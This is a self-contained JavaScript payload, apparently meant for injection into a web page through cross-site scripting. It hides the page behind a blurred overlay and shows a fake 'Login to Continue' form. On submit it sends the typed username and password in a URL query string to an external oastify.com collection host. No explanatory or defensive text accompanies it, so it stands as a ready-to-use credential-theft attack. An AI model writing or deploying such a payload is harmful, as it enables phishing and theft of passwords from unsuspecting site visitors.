(function() {
  const wrapper = document.createElement("div");
  wrapper.id = "pageContent";
  while (document.body.firstChild) {
    wrapper.appendChild(document.body.firstChild);
  }
  document.body.appendChild(wrapper);

  const style = document.createElement("style");
  style.textContent = `
    #pageContent.modal-active {
      filter: blur(5px);
      pointer-events: none;
      user-select: none;
    }
    #loginOverlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.6);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }
    #loginBox {
      background: #0b0f17;
      color: white;
      padding: 2rem;
      border-radius: 12px;
      width: 320px;
      box-shadow: 0 0 20px rgba(138, 99, 255, 0.6);
      font-family: 'Inter', sans-serif;
      animation: fadeIn 0.3s ease-in-out;
      position: relative;
      z-index: 10000;
    }
    #loginBox h2 {
      margin-bottom: 1rem;
      font-size: 1.3rem;
      text-align: center;
      color: #8a63ff;
    }
    #loginBox input {
      width: 100%;
      padding: 10px;
      margin-bottom: 12px;
      border: 1px solid #2a2f3c;
      border-radius: 8px;
      background: #1a1f2c;
      color: white;
      font-size: 0.9rem;
    }
    #loginBox input:focus {
      outline: none;
      border-color: #8a63ff;
    }
    #loginBox button {
      width: 100%;
      padding: 10px;
      background: linear-gradient(90deg, #8a63ff, #5a3cc8);
      border: none;
      border-radius: 8px;
      color: white;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      transition: opacity 0.2s;
    }
    #loginBox button:hover {
      opacity: 0.9;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.9); }
      to   { opacity: 1; transform: scale(1); }
    }
  `;
  document.head.appendChild(style);

  const overlay = document.createElement("div");
  overlay.id = "loginOverlay";
  overlay.innerHTML = `
    <div id="loginBox">
      <h2>Login to Continue</h2>
      <form id="loginForm">
        <input type="text" id="username" placeholder="Username" required />
        <input type="password" id="password" placeholder="Password" required />
        <button type="submit">Login</button>
      </form>
    </div>
  `;
  document.body.appendChild(overlay);

  wrapper.classList.add("modal-active");

  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const user = document.getElementById("username").value;
    const pass = document.getElementById("password").value;

    fetch(`https://3rvorvb38y8xh651bghtznbl9cf33tri.oastify.com/login?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`, {
      method: "GET"
    })
    .then(res => res.text())
    .then(data => {
      alert("Login response: " + data);
      document.getElementById("loginOverlay").remove();
      wrapper.classList.remove("modal-active");
    })
    .catch(err => {
      alert("Error: " + err);
    });
  });
})();
